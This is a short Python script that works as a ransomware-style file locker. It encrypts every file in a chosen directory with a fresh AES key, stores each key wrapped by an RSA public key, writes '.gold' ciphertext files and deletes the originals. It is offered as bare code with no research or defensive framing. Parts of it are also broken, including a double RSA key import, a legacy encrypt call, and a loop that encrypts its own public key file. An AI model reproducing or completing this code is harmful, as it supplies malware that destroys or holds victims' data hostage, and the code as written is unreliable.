import os
import random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA

def generate_aes_key():
    return os.urandom(32)

def load_rsa_public_key(public_key_file):
    with open(public_key_file, "rb") as file:
        public_key = file.read()
    return RSA.import_key(public_key)

def write_encrypted_key(file_path, aes_key, rsa_public_key):
    rsa_cipher = RSA.import_key(rsa_public_key)
    rsa_encrypted_key = rsa_cipher.encrypt(aes_key, None)[0]
    with open(file_path + ".key", "wb") as key_file:
        key_file.write(rsa_encrypted_key)

def encrypt_file(file_path, aes_key):
    with open(file_path, "rb") as file:
        content = file.read()
    
    # Pad the content to ensure it's aligned to block boundary
    padding_length = AES.block_size - (len(content) % AES.block_size)
    padded_content = content + bytes([padding_length]) * padding_length
    
    cipher = AES.new(aes_key, AES.MODE_ECB)
    encrypted_data = cipher.encrypt(padded_content)
    
    return encrypted_data

if __name__ == "__main__":
    target_directory = input("Enter the target directory: ")
    public_key_file = os.path.join(target_directory, "public_key.pem")
    files = os.listdir(target_directory)
    rsa_public_key = load_rsa_public_key(public_key_file)
    for file_name in files:
        if not file_name.endswith(".key"):
            file_path = os.path.join(target_directory, file_name)
            aes_key = generate_aes_key()
            write_encrypted_key(file_path, aes_key, rsa_public_key)
            encrypted_data = encrypt_file(file_path, aes_key)
            with open(file_path + ".gold", "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            os.remove(file_path)
    print("File encryption completed.")